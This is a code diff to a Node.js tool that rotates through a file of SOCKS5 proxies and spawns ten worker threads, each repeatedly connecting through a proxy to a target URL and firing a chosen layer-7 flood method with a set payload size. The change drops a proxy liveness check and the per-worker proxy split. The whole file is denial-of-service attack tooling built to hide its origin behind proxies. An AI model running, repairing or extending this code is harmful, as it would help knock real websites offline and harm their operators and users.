@@ -6,61 +6,33 @@ const fs = require('fs');
 const validSocks5Proxies = fs.readFileSync('valid_socks5.txt', 'utf8').split('\n').filter(Boolean);
 
 if (!isMainThread) {
-    const { targetUrl, delay, kbSize, method, proxies } = workerData;
+    const { targetUrl, delay, kbSize, method } = workerData;
     const target = new URL(targetUrl);
 
     let proxyIndex = 0;
 
     function getNextProxy() {
-        const proxy = proxies[proxyIndex];
-        proxyIndex = (proxyIndex + 1) % proxies.length;
+        const proxy = validSocks5Proxies[proxyIndex];
+        proxyIndex = (proxyIndex + 1) % validSocks5Proxies.length; 
         return proxy;
     }
 
-    async function isProxyAlive(proxy) {
-        const [proxyIp, proxyPort] = proxy.split(':');
-        try {
-            const options = {
-                proxy: {
-                    ipaddress: proxyIp,
-                    port: parseInt(proxyPort),
-                    type: 5,
-                },
-                destination: {
-                    host: 'example.com',
-                    port: 80,
-                },
-                command: 'connect',
-                timeout: 5000,
-            };
-            await SocksClient.createConnection(options);
-            return true;
-        } catch (err) {
-            return false;
-        }
-    }
-
-    setInterval(async () => {
+    setInterval(() => {
         const proxy = getNextProxy();
-        const isAlive = await isProxyAlive(proxy);
-        if (!isAlive) {
-            console.error(`LDS: Proxy ${proxy} is dead, skipping...`);
-            return;
-        }
-
         const [proxyIp, proxyPort] = proxy.split(':');
+
         const options = {
             proxy: {
                 ipaddress: proxyIp,
                 port: parseInt(proxyPort),
-                type: 5,
+                type: 5, 
             },
             destination: {
                 host: target.hostname,
                 port: target.port || (target.protocol === 'https:' ? 443 : 80),
             },
             command: 'connect',
-            timeout: 5000,
+            timeout: 5000, 
         };
 
         SocksClient.createConnection(options, (err, info) => {
@@ -70,7 +42,7 @@ if (!isMainThread) {
             }
 
             if (info && info.socket) {
-                layer7[method](info.socket, target, kbSize);
+                layer7[method](info.socket, target, kbSize); 
             } else {
                 console.error(`LDS: Socket not initialized for ${targetUrl}`);
             }
@@ -79,13 +51,10 @@ if (!isMainThread) {
 }
 
 function start(targetUrl, delay, kbSize, method) {
-    const numWorkers = 10;
-    const proxiesPerWorker = Math.ceil(validSocks5Proxies.length / numWorkers);
-
+    const numWorkers = 10; 
     for (let i = 0; i < numWorkers; i++) {
-        const workerProxies = validSocks5Proxies.slice(i * proxiesPerWorker, (i + 1) * proxiesPerWorker);
         const worker = new Worker(__filename, {
-            workerData: { targetUrl, delay, kbSize, method, proxies: workerProxies },
+            workerData: { targetUrl, delay, kbSize, method },
         });
 
         worker.on('error', (err) => {
